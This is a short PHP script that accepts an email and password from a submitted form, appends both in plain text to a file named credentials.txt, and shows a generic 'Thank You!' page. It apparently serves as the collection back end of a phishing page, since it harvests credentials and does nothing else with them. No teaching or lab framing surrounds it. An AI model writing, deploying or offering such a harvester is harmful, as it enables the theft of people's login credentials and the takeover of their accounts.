<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['email']) && isset($_POST['password'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $file = fopen('credentials.txt', 'a');
        $logEntry = "Email: " . $email . " - Password: " . $password . "\n";
        fwrite($file, $logEntry);
        fclose($file);
        echo "<html>
                <head>
                    <title>Submission Received</title>
                </head>
                <body>
                    <h1>Thank You!</h1>
                    <p>Your submission has been received.</p>
                </body>
              </html>";
    } else {
        echo "Missing required fields.";
    }
}
?>
